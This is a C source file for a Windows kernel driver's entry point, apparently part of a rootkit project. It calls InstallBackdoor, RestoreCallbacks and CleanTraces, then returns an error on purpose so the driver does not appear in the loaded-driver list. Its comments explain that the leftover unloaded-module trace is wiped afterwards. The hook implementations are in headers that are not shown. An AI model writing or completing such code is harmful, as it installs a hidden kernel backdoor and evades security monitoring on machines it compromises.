#include <ntddk.h>
#include <aux_klib.h>

#include "Hook.h"
#include "Restore.h"

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);

	NTSTATUS Status = STATUS_SUCCESS;

	Status = AuxKlibInitialize();
	if (!NT_SUCCESS(Status))
	{
		return STATUS_INVALID_PARAMETER;
	}

	Status = InstallBackdoor();
	if (!NT_SUCCESS(Status))
	{
		return STATUS_INVALID_PARAMETER;
	}

	// TODO: To be complete!
	Status = RestoreCallbacks();
	if (!NT_SUCCESS(Status))
	{
		return STATUS_INVALID_PARAMETER;
	}

	// TODO: To be complete!
	Status = CleanTraces();
	if (!NT_SUCCESS(Status))
	{
		return STATUS_INVALID_PARAMETER;
	}

	// We return STATUS_INVALID_PARAMETER to prevent the kernel from completely loading the driver into memory.
	// This way, it won't be added to the list of loaded drivers (though it will appear in the unloaded modules list... which is why we'll wipe it after we return to user-mode).
	// In addition, you can also have an attempt at reloading the driver instantly incase the writes fail.
	return STATUS_INVALID_PARAMETER;
}